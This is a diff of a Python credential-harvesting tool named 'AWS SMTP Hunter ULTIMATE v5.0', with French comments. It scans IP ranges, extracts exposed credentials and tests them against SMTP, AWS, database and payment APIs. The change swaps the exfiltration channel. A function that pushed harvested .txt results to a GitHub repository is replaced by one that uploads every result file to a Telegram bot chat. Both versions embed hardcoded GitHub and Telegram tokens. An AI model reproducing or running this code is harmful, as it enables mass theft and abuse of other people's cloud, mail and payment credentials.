@@ -2869,8 +2869,8 @@ You can use these credentials for email sending.
         except Exception as e:
             self.logger.error(f"Error saving intelligence: {e}")
             
-        # Push vers GitHub
-        push_results_to_github()
+        # Envoi vers Telegram
+        send_results_to_telegram()
 
         # Stats finales
         self.print_final_comprehensive_stats()
@@ -2949,145 +2949,165 @@ You can use these credentials for email sending.
 
 # ==================== FONCTIONS UTILITAIRES ====================
 
-def push_results_to_github():
-    """🔁 Push via API GitHub UNIQUEMENT - ZERO Git"""
+def send_results_to_telegram():
+    """📱 Envoi des résultats par Telegram"""
     try:
         import requests
-        import base64
         from datetime import datetime
         import platform
         
         timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
         
-        # Configuration GitHub - TON NOUVEAU TOKEN
-        GITHUB_TOKEN = "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"
-        REPO_OWNER = "mehdi28777"
-        REPO_NAME = "data"
-        
-        headers = {
-            'Authorization': f'token {GITHUB_TOKEN}',
-            'Accept': 'application/vnd.github.v3+json',
-            'User-Agent': 'AWS-SMTP-Hunter-v5.0'
-        }
+        # Configuration Telegram - REMPLACE PAR TES VRAIES VALEURS
+        TELEGRAM_BOT_TOKEN = "6611453715:AAGdZ-77M3HzHMHtHSv5_-Wgrt2tUUXhP44"  # Token de @BotFather
+        TELEGRAM_CHAT_ID = "-1001945561814"     # Ton chat ID
         
         # Détection environnement
         environment = "Render" if os.environ.get('RENDER') else platform.system()
         print(f"🔍 Environment: {environment}")
-        print(f"🚀 Uploading files via GitHub API (ZERO Git usage)...")
+        print(f"📱 Sending files via Telegram...")
         
-        files_uploaded = 0
+        files_sent = 0
         files_found = 0
+        total_size = 0
         
-        # Lister tous les fichiers .txt dans le répertoire courant
+        # Compter les fichiers d'abord
         for filename in os.listdir("."):
+            if filename.endswith(".txt"):
+                files_found += 1
+                try:
+                    total_size += os.path.getsize(filename)
+                except:
+                    pass
+        
+        if files_found == 0:
+            print("⚠️ No .txt files found to send")
+            return False
+        
+        # Envoi du message de début
+        start_message = f"🔥 <b>{environment} Scan Results</b>\n\n"
+        start_message += f"📅 <b>Date:</b> {timestamp}\n"
+        start_message += f"📊 <b>Files found:</b> {files_found}\n"
+        start_message += f"📁 <b>Total size:</b> {total_size/1024:.1f} KB\n\n"
+        start_message += f"📤 Starting file transfer..."
+        
+        start_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
+        start_data = {
+            'chat_id': TELEGRAM_CHAT_ID,
+            'text': start_message,
+            'parse_mode': 'HTML'
+        }
+        
+        start_response = requests.post(start_url, data=start_data, timeout=10)
+        if start_response.status_code != 200:
+            print(f"❌ Failed to send start message: {start_response.status_code}")
+            print(f"Response: {start_response.text}")
+            return False
+        
+        print("✅ Start message sent")
+        
+        # Envoyer chaque fichier .txt
+        for filename in sorted(os.listdir(".")):
             if not filename.endswith(".txt"):
                 continue
                 
-            files_found += 1
-            
             try:
-                print(f"📤 Processing: {filename}")
+                print(f"📤 Sending: {filename}")
                 
-                # Lire le contenu du fichier
-                with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
-                    content = f.read()
+                # Vérifier la taille du fichier
+                file_size = os.path.getsize(filename)
                 
-                # Vérifier que le fichier n'est pas vide
-                if not content.strip():
-                    print(f"⚠️ Skipping empty file: {filename}")
+                if file_size > 50 * 1024 * 1024:  # 50MB max Telegram
+                    print(f"⚠️ File too large: {filename} ({file_size/1024/1024:.1f} MB)")
+                    # Envoyer un message d'erreur
+                    error_msg = f"❌ <b>{filename}</b> too large ({file_size/1024/1024:.1f} MB)\nMax size: 50 MB"
+                    requests.post(start_url, data={
+                        'chat_id': TELEGRAM_CHAT_ID,
+                        'text': error_msg,
+                        'parse_mode': 'HTML'
+                    }, timeout=10)
                     continue
                 
-                # Encoder le contenu en base64 (requis par l'API GitHub)
-                content_bytes = content.encode('utf-8')
-                content_b64 = base64.b64encode(content_bytes).decode('utf-8')
+                if file_size == 0:
+                    print(f"⚠️ Empty file: {filename}")
+                    continue
                 
-                # Préparer le nom de fichier avec préfixe environnement et timestamp
-                upload_filename = f"{environment.lower()}_{timestamp}_{filename}"
+                # Préparer le caption
+                caption = f"📄 <b>{filename}</b>\n"
+                caption += f"🌍 <b>Source:</b> {environment}\n"
+                caption += f"📊 <b>Size:</b> {file_size/1024:.1f} KB\n"
+                caption += f"🕐 <b>Time:</b> {timestamp}"
                 
-                # Données pour l'API GitHub
-                data = {
-                    'message': f'{environment} scan - {filename} - {timestamp}',
-                    'content': content_b64,
-                    'branch': 'main'
-                }
+                # Envoyer le fichier
+                send_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
                 
-                # URL de l'API pour ce fichier
-                api_url = f'https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{upload_filename}'
+                with open(filename, 'rb') as file:
+                    files_data = {'document': (filename, file, 'text/plain')}
+                    data = {
+                        'chat_id': TELEGRAM_CHAT_ID,
+                        'caption': caption,
+                        'parse_mode': 'HTML'
+                    }
+                    
+                    response = requests.post(send_url, data=data, files=files_data, timeout=30)
                 
-                # Vérifier si le fichier existe déjà (pour récupérer le SHA)
-                print(f"🔍 Checking if {upload_filename} exists...")
-                check_response = requests.get(api_url, headers=headers, timeout=15)
-                
-                if check_response.status_code == 200:
-                    # Fichier existe, récupérer le SHA pour la mise à jour
-                    existing_file = check_response.json()
-                    data['sha'] = existing_file['sha']
-                    print(f"📝 File exists, updating...")
-                elif check_response.status_code == 404:
-                    # Fichier n'existe pas, création
-                    print(f"📝 File doesn't exist, creating new...")
+                if response.status_code == 200:
+                    print(f"✅ Sent: {filename}")
+                    files_sent += 1
                 else:
-                    print(f"⚠️ Unexpected response: {check_response.status_code}")
-                
-                # Créer ou mettre à jour le fichier
-                print(f"🚀 Uploading {upload_filename} to GitHub...")
-                response = requests.put(api_url, headers=headers, json=data, timeout=30)
-                
-                if response.status_code in [200, 201]:
-                    status = "Updated" if response.status_code == 200 else "Created"
-                    print(f"✅ {status}: {upload_filename}")
-                    files_uploaded += 1
-                else:
-                    print(f"❌ Failed to upload {filename}")
-                    print(f"   HTTP Status: {response.status_code}")
-                    try:
-                        error_data = response.json()
-                        print(f"   Error Message: {error_data.get('message', 'Unknown error')}")
-                        if 'errors' in error_data:
-                            for error in error_data['errors']:
-                                print(f"   Detail: {error}")
-                    except:
-                        print(f"   Raw response: {response.text[:300]}")
+                    print(f"❌ Failed to send {filename}: {response.status_code}")
+                    print(f"Response: {response.text[:200]}")
+                    
+                # Petit délai pour éviter le rate limiting
+                import time
+                time.sleep(1)
                         
             except requests.exceptions.Timeout:
-                print(f"❌ Timeout uploading {filename}")
-                continue
-            except requests.exceptions.RequestException as e:
-                print(f"❌ Network error for {filename}: {e}")
+                print(f"❌ Timeout sending {filename}")
                 continue
             except Exception as e:
-                print(f"❌ Error processing {filename}: {e}")
+                print(f"❌ Error sending {filename}: {e}")
                 continue
         
-        # Résumé final détaillé
-        print(f"\n📊 GITHUB API UPLOAD SUMMARY:")
-        print(f"   Environment:    {environment}")
-        print(f"   Timestamp:      {timestamp}")
-        print(f"   Files found:    {files_found}")
-        print(f"   Files uploaded: {files_uploaded}")
-        print(f"   Success rate:   {(files_uploaded/max(1,files_found)*100):.1f}%")
+        # Message de fin avec résumé
+        summary_message = f"📊 <b>Transfer Complete!</b>\n\n"
+        summary_message += f"✅ <b>Files sent:</b> {files_sent}/{files_found}\n"
+        summary_message += f"📈 <b>Success rate:</b> {(files_sent/max(1,files_found)*100):.1f}%\n"
+        summary_message += f"🕐 <b>Completed:</b> {datetime.now().strftime('%H:%M:%S')}\n\n"
         
-        if files_uploaded > 0:
-            print(f"\n🎉 API SUCCESS! {files_uploaded} files uploaded to GitHub!")
-            print(f"🔗 View repository: https://github.com/{REPO_OWNER}/{REPO_NAME}")
-            print(f"🔗 Latest commit: https://github.com/{REPO_OWNER}/{REPO_NAME}/commits/main")
+        if files_sent > 0:
+            summary_message += f"🎉 <b>All scan results delivered!</b>"
+        else:
+            summary_message += f"❌ <b>No files were sent successfully</b>"
+        
+        requests.post(start_url, data={
+            'chat_id': TELEGRAM_CHAT_ID,
+            'text': summary_message,
+            'parse_mode': 'HTML'
+        }, timeout=10)
+        
+        # Résumé final dans la console
+        print(f"\n📊 TELEGRAM UPLOAD SUMMARY:")
+        print(f"   Environment:    {environment}")
+        print(f"   Files found:    {files_found}")
+        print(f"   Files sent:     {files_sent}")
+        print(f"   Success rate:   {(files_sent/max(1,files_found)*100):.1f}%")
+        
+        if files_sent > 0:
+            print(f"\n🎉 SUCCESS! {files_sent} files sent to Telegram!")
+            print(f"📱 Check your Telegram bot for all files")
             return True
         else:
-            print(f"\n❌ API FAILED! No files were uploaded successfully")
-            if files_found == 0:
-                print("   Reason: No .txt files found in current directory")
-            else:
-                print("   Reason: All upload attempts failed")
+            print(f"\n❌ FAILED! No files were sent successfully")
             return False
             
     except ImportError as e:
-        print(f"❌ Missing required module for GitHub API: {e}")
-        print("💡 Solution: pip install requests")
+        print(f"❌ Missing required module: {e}")
+        print("💡 Try: pip install requests")
         return False
     except Exception as e:
-        print(f"❌ Critical error in GitHub API upload: {e}")
+        print(f"❌ Critical error in Telegram upload: {e}")
         import traceback
-        print("📋 Full error traceback:")
         traceback.print_exc()
         return False
 
@@ -3160,19 +3180,6 @@ def show_interactive_menu():
     print("   2. RANDOM   - Pure random generation for maximum coverage")
     print("   3. HYBRID   - 70% Smart + 30% Random (RECOMMENDED)")
     print()
-    print("⚡ FEATURES INCLUDED:")
-    print("   • Async + Multi-threading for maximum performance")
-    print("   • Real-time framework detection (Laravel, Symfony, Django, etc.)")
-    print("   • Complete credential extraction and exploitation")
-    print("   • Live SMTP testing with real email sending")
-    print("   • AWS credentials testing with service quotas")
-    print("   • Database connection testing (MySQL, PostgreSQL)")
-    print("   • API testing (Twilio, Stripe, SendGrid, Mailgun)")
-    print("   • Intelligent learning and adaptation")
-    print("   • Advanced performance monitoring")
-    print("   • Automatic cleanup and optimization")
-    print("   • Comprehensive logging and reporting")
-    print()
     
     while True:
         try:
@@ -3241,24 +3248,18 @@ def parse_command_line_arguments():
     """📋 Parsing des arguments CLI ultra-complet"""
     parser = argparse.ArgumentParser(
         description="🔥 AWS SMTP Hunter ULTIMATE v5.0 - Complete Edition",
-        formatter_class=argparse.RawDescriptionHelpFormatter,
-        epilog="""
-🔥 EXAMPLES:
-  python hunter.py                                    # Interactive mode
-  python hunter.py --mode hybrid --threads 1000      # Quick start
-  python hunter.py --mode smart --threads 2000 --email your@email.com --debug
-        """
+        formatter_class=argparse.RawDescriptionHelpFormatter
     )
     
-    parser.add_argument('--mode', '-m', choices=['smart', 'random', 'hybrid'], help='IP generation mode')
-    parser.add_argument('--threads', '-t', type=int, help='Number of threads')
-    parser.add_argument('--email', '-e', type=str, help='Test email for SMTP validation')
-    parser.add_argument('--debug', '-d', action='store_true', help='Enable debug mode')
-    parser.add_argument('--output-dir', '-o', type=str, help='Output directory')
-    parser.add_argument('--config', type=str, help='Load configuration from JSON file')
+    parser.add_argument('--mode', '-m', choices=['smart', 'random', 'hybrid'])
+    parser.add_argument('--threads', '-t', type=int)
+    parser.add_argument('--email', '-e', type=str)
+    parser.add_argument('--debug', '-d', action='store_true')
+    parser.add_argument('--output-dir', '-o', type=str)
+    parser.add_argument('--config', type=str)
     parser.add_argument('--version', '-v', action='version', version='AWS SMTP Hunter ULTIMATE v5.0')
-    parser.add_argument('--quiet', '-q', action='store_true', help='Quiet mode')
-    parser.add_argument('--no-async', action='store_true', help='Disable async mode')
+    parser.add_argument('--quiet', '-q', action='store_true')
+    parser.add_argument('--no-async', action='store_true')
     
     return parser.parse_args()
 
@@ -3367,7 +3368,7 @@ def main():
         print(f"   Threads:           {threads}")
         print(f"   Test Email:        {email}")
         print(f"   Debug Mode:        {debug}")
-        print(f"   GitHub API:        ✅ Enabled (NO Git)")
+        print(f"   Telegram API:      ✅ Enabled")
     
     # Création du hunter
     try:
@@ -3384,10 +3385,6 @@ def main():
         # Confirmation finale si interactif
         if not args.mode and not args.quiet:
             print(f"\n🚀 READY TO START COMPLETE SCAN!")
-            print(f"   This will use {threads} threads for maximum performance")
-            print(f"   All credentials found will be tested and verified")
-            print(f"   Results will be saved in multiple output files")
-            print(f"   Real-time monitoring and adaptation enabled")
             input("\n🚀 Press Enter to start the complete scan...")
         
         # Lancement du scan complet
